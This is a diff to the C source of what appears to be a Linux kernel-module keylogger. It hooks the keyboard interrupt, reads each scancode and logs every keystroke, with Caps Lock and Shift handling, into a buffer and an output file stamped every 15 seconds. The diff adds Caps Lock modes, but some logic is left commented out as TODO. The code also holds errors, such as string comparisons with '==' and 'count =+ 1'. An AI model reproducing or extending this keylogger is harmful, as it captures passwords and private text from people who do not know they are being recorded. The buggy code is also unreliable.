@@ -22,6 +22,13 @@
 #define LEFT_SHIFT_RELEASE 0xaa
 #define RIGHT_SHIFT_RELEASE 0xb6
 int shiftPressed = 0;
+#define CAPS_LOCK 0x3a
+int capsLockEnabled = 0;
+#define NORMAL_MODE 0
+#define SHIFT_MODE 1
+#define CAPS_LOCK_MODE 2
+#define SHIFT_CAPS_LOCK_MODE 3
+#define NUMBER_OF_MODES 3 // TODO: change to 4 when shift+caps_lock implemented
 
 // output file constants/variables
 #define OUTPUT_MODE 0644
@@ -48,7 +55,7 @@ char timestamp[TS_SIZE];
 struct file *createFile(const char *path);
 int writeToFile(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size);
 void closeFile(struct file *file);
-static irqreturn_t get_scancode(int irq, void *dev_id);
+static irqreturn_t get_scancode(int irq, void *id);
 void scancode_to_key(char scancode);
 void check_shift(unsigned char scancode);
 void write_buffer_to_output(void);
@@ -59,27 +66,46 @@ static void remove_timers(void);
 int get_timestamp_index(char c);
 
 //Matrix of all characters we will be tracking. Assuming a standard 101/102 US keyboard
-
-char *scancodes[][2] = {
-  {"/0", "/0"}, {"/e", "/e"}, {"1", "!"}, {"2", "@"}, {"3", "#"},
-  {"4", "$"}, {"5", "%"}, {"6", "^"}, {"7", "&"}, {"8", "*"},
-  {"9", "("}, {"0", ")"}, {"-","_"}, {"=", "+"}, {"/b", "/b"},
-  {"/t", "/t"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r","R"}, {"t", "T"},
-  {"y", "Y"}, {"u", "U"}, {"i","I"}, {"o", "O"}, {"p", "P"}, {"[", "{"},
-  {"]", "}"}, {"/n", "/n"}, {"LCtrl", "LCtrl"}, {"a", "A"}, {"s", "S"}, {"d", "D"},
-  {"f", "F"}, {"g", "G"}, {"h", "H"}, {"j", "J"}, {"k", "K"}, {"l", "L"},
-  {";", ":"}, {"\'", "\""}, {"`", "~"},{"LShift", "LShift"}, {"\\", "|"},
-  {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},{"b", "B"}, {"n", "N"},
-  {"m", "M"}, {",", "<"},{".", ">"}, {"/", "?"}, {"RShift", "RShift"},
-  {"PrtScn", "KeyPad"},{"LAlt", "LAlt"}, {" ", " "}, {"CapsLock", "CapsLock"},
-  {"F1", "F1"},{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"}, 
-  {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},{"F10", "F10"},
-  {"NumLock", "NumLock"}, {"ScrollLock", "ScrollLock"}, {"Keypad-7", "Home"},
-  {"Keypad-8", "Up"}, {"Keypad-9", "PgUp"},{"-", "-"}, {"Keypad-4", "Left"},
-  {"Keypad-5", "Keypad-5"},{"Keypad-6", "Right"}, {"+", "+"}, {"Keypad-1", "End"},
-  {"Keypad-2", "Down"}, {"Keypad-3", "PgDn"}, {"Keypad-0", "Ins"}, 
-  {"Keypad-", "Del"}, {"Alt-SysRq", "Alt-SysRq"}, {"\0", "\0"},{"\0", "\0"},
-  {"F11", "F11"}, {"F12", "F12"} };                                 
+/* For the 2nd index: 	index = 0, no special keys enabled
+			index = 1, only shift enabled
+			index = 2, only caps lock enabled
+			index = 3, both caps lock and shift enabled
+*/
+char *scancodes[][NUMBER_OF_MODES] = {
+	{"/0", "/0", "/0"}, 	{"/e", "/e", "/e"}, 	{"1", "!", "1"}, 
+	{"2", "@", "2"}, 		{"3", "#", "3"}, 		{"4", "$", "4"}, 
+	{"5", "%", "5"}, 		{"6", "^", "6"}, 		{"7", "&", "7"}, 
+	{"8", "*", "8"}, 		{"9", "(", "9"}, 		{"0", ")", "0"}, 
+	{"-","_", "-"}, 		{"=", "+", "="}, 		{"/b", "/b", "/b"}, 
+	{"/t", "/t", "/t"}, 	{"q", "Q", "Q"}, 		{"w", "W", "W"},
+	{"e", "E", "E"}, 		{"r","R", "R"}, 		{"t", "T", "T"}, 
+	{"y", "Y", "Y"}, 		{"u", "U", "U"}, 		{"i","I", "I"}, 
+	{"o", "O", "O"},		{"p", "P", "P"},		{"[", "{", "["}, 
+	{"]", "}", "]"}, 		{"/n", "/n", "/n"}, 	{"LCtrl", "LCtrl", "LCtrl"}, 
+	{"a", "A", "A"}, 		{"s", "S", "S"}, 		{"d", "D", "D"}, 
+	{"f", "F", "F"}, 		{"g", "G", "G"}, 		{"h", "H", "H"}, 
+	{"j", "J", "J"}, 		{"k", "K", "K"}, 		{"l", "L", "L"}, 
+	{";", ":", ";"}, 		{"\'", "\"", "\'"}, 	{"`", "~", "`"},
+	{"LShift","LShift","LShift"},				{"\\", "|", "\\"}, 
+	{"z", "Z", "Z"}, 		{"x", "X", "X"}, 		{"c", "C", "C"}, 
+	{"v", "V", "V"}, 		{"b", "B", "B"}, 		{"n", "N", "N"},
+	{"m", "M", "M"}, 		{",", "<", ","}, 		{".", ">", "."},
+	{"/", "?", "/"},		{"RShift", "RShift", "RShift"},
+	{"PrtScn", "KeyPad", "PrtScn"},				{"LAlt", "LAlt", "LAlt"}, 
+	{" ", " ", " "}, 		{"CapsLock", "CapsLock", "CapsLock"}, 
+	{"F1", "F1", "F1"}, 	{"F2", "F2", "F2"}, 	{"F3", "F3", "F3"}, 
+	{"F4", "F4", "F4"}, 	{"F5", "F5", "F5"}, 	{"F6", "F6", "F6"},
+	{"F7", "F7", "F7"}, 	{"F8", "F8", "F8"}, 	{"F9", "F9", "F9"},
+	{"F10", "F10", "F10"}, 	{"NumLock", "NumLock", "NumLock"}, 
+	{"ScrlLck", "ScrlLck", "ScrlLck"}, 			{"Keypad-7", "Home", "Keypad-7"}, 
+	{"Keypad-8", "Up", "Keypad-8"}, 				{"Keypad-9", "PgUp", "Keypad-9"}, 
+	{"-", "-", "-"},		{"Keypad-4", "Left", "Keypad-4"},
+	{"Keypad-5", "Keypad-5", "Keypad-5"},		{"Keypad-6", "Right", "Keypad-6"},
+	{"+", "+", "+"}, 		{"Keypad-1", "End", "Keypad-1"}, 
+	{"Keypad-2", "Down", "Keypad-2"}, 			{"Keypad-3", "PgDn", "Keypad-3"},
+	{"Keypad-0", "Ins", "Keypad-0"}, 			{"Keypad-.", "Del", "Keypad-."}, 
+	{"Alt-SysRq", "Alt-SysRq", "Alt-SysRq"}, 		{"\0", "\0", "\0"}, 
+	{"\0", "\0", "\0"}, 	{"F11", "F11", "F11"}, 	{"F12", "F12", "F12"} };                                  
 
 //Creating the output file
 struct file *createFile(const char *path) 
@@ -120,29 +146,57 @@ void closeFile(struct file *file)
 }
 
 // gets the scancode of each pressed key
-static irqreturn_t get_scancode(int irq, void *dev_id)
+static irqreturn_t get_scancode(int irq, void *id)
 {
 	unsigned char scancode;
 	scancode = inb(KBD_INPUT_PORT);
 	check_shift(scancode);
 	scancode_to_key(scancode);
-    return IRQ_HANDLED;
+	return IRQ_HANDLED;
 }
 
 void scancode_to_key(char scancode)
 {
 	if (scancodes[scancode][0] != '\0')
 	{
-		printk("%s\n", scancodes[scancode][shiftPressed]);
 		mutex_lock(&buffer_mutex);
-		char_buffer[pos] = scancodes[scancode][shiftPressed];
-		mutex_unlock(&buffer_mutex);
+
+		if (capsLockEnabled == 1 && shiftPressed == 0) // only caps lock enabled
+		{
+			printk("%s\n", scancodes[scancode][CAPS_LOCK_MODE]);
+			char_buffer[pos] = scancodes[scancode][CAPS_LOCK_MODE];
+		}
+
+		//TODO: implement
+/*
+		else if (capsLockEnabled == 1 && shiftPressed == 1) // both caps lock and shift enabled
+		{
+			printk("%s\n", scancodes[scancode][SHIFT_CAPS_LOCK_MODE]);
+			char_buffer[pos] = scancodes[scancode][SHIFT_CAPS_LOCK_MODE];
+		}
+*/
+
+		else if (capsLockEnabled == 0 && shiftPressed == 1) // only shift enabled
+		{
+			printk("%s\n", scancodes[scancode][SHIFT_MODE]);
+			char_buffer[pos] = scancodes[scancode][SHIFT_MODE];
+		}
+
+		else // neither caps lock or shift enabled
+		{
+			printk("%s\n", scancodes[scancode][NORMAL_MODE]);
+			char_buffer[pos] = scancodes[scancode][NORMAL_MODE];
+		}
+
 		pos++;
+
 		if (pos >= B_SIZE) 
 		{
 			pos = 0;
 			rollover++;
 		}
+
+		mutex_unlock(&buffer_mutex);
 	}
 }
 
@@ -150,13 +204,30 @@ void check_shift(unsigned char scancode)
 {
 	if (scancode == LEFT_SHIFT || scancode == RIGHT_SHIFT)
 	{
+		printk("Shift now enabled.");
 		shiftPressed = 1;
 	}
 
 	if (scancode == LEFT_SHIFT_RELEASE || scancode == RIGHT_SHIFT_RELEASE)
 	{
+		printk("Shift now disabled.");
 		shiftPressed = 0;
 	}
+
+	if (scancode == CAPS_LOCK && capsLockEnabled == 0)
+	{
+		printk("Caps Lock now enabled.");
+		capsLockEnabled = 1;
+	}
+
+	//TODO: implement
+/*
+	if (scancode == CAPS_LOCK && capsLockEnabled == 1)
+	{
+		printk("Caps Lock now disabled.");
+		capsLockEnabled = 0;
+	}
+*/
 }
 
 // writes all the characters stored in the buffer to the output file
@@ -173,7 +244,6 @@ void write_buffer_to_output(void)
 
 	while (i < max_size)
 	{
-	  
 		writeToFile(outfile, 0, char_buffer[i], 1);
 		if(char_buffer[i]  == " " || char_buffer[i] == "/L"){
 		  count =+ 1;
@@ -215,11 +285,10 @@ static void initialize_timers(void)
 
 static enum hrtimer_restart print_timestamp(struct hrtimer * timer)
 {
-	// adds a timestamp to the output file every 15 seconds; currently only works if hard-coded
+	char code;
+	// adds a timestamp to the output file every 15 seconds
 	mutex_lock(&buffer_mutex);
 	generate_timestamp();
-
-	char code;
 
 	code = timestamp[0];
 	char_buffer[pos] = scancodes[get_timestamp_index(code)][0];
@@ -257,7 +326,7 @@ static void remove_timers(void)
 
 int get_timestamp_index(char c)
 {
-	int index;
+	int index = 0;
 	switch(c)
 	{
 		case '[':
